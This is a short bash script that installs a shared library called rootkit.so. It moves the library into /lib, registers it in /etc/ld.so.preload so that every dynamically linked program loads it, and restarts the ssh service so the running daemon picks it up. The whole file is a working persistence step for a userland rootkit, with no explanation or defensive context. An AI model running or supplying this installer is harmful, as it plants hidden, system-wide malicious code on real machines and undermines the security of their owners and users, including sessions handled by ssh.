#!/bin/bash

LIBNAME=rootkit.so
LIBPATH="$PWD/$LIBNAME"
LIBDEST="/lib/$LIBNAME"

mv $LIBNAME $LIBDEST
echo $LIBDEST > /etc/ld.so.preload
sudo systemctl restart ssh
